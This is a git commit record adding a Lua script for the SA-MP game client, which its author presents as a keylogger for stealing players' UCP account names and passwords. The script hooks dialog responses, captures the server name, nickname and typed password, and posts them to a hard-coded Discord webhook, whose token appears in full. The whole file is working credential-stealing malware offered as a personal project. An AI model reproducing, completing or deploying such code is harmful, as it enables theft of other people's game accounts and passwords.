e071b8f6997436e8d770b0df5da95459867f23ce
justklol <ucpevader@gmail.com>
2024-11-30 21:33:29 +0700

    KEYLOGGER samp by justk v0.1
    this is my little project on samp this file is use to take someone UCP (User Character Panel) and also taking the Password, in this file i use simple command to use this file can be used on android file like Monetloader.lua for the pc im still trying

---
+++ -- Keylogger by_ Justk --.lua
@@ -0,0 +1,46 @@
+-- Keylogger by: Justk --
+-- Version: 0.1 --
+-- Programmed using: vscode.dev syntax:LUA --
+--_  _ ____ _   _ _    ____ ____--       
+--|_/  |___  \_/  |    |  | | __--       
+--| \_ |___   |   |___ |__| |__I--    
+                                     
+--___  _   _   _ _  _ ____ ___ _  _--    
+--|__]  \_/  . | |  | [__   |  |_/ --    
+--|__]   |   ._| |__| ___]  |  | \_--    
+
+--mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm--
+--mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm--                                                    
+
+require 'lib.moonloader'
+local requests = require 'requests'
+local sampev = require 'lib.samp.events'
+
+function main()
+    while not isSampAvailable() do
+        wait(100)
+    end
+end
+
+function sampev.onSendDialogResponse(satu,dua,tiga,inputtext)
+    local servername = sampGetCurrentServerName()
+    local boolean,id = sampGetPlayerIdByCharHandle(PLAYER_PED)
+    local playerName = sampGetPlayerNickname(id) 
+
+    sendToDiscord(string.format("server: %s username: %s password: %s", servername, playerName, inputtext))
+end
+
+function sendToDiscord(message)
+    local webhook_url = "https://discord.com/api/webhooks/1311729481173700688/wLdX5OVGvsErQZHATXzuC_RL6Pqvh8eqXrqp9m2WR6l6g_vEx9IDueluL3Hge8OKZwB8"
+    local response = requests.post{
+        url = webhook_url,
+        headers = {
+            ["Content-Type"] = "application/json"
+        },
+        data = {
+            content = message,
+            username = "mata 2km"
+        }
+    }
+
+end 
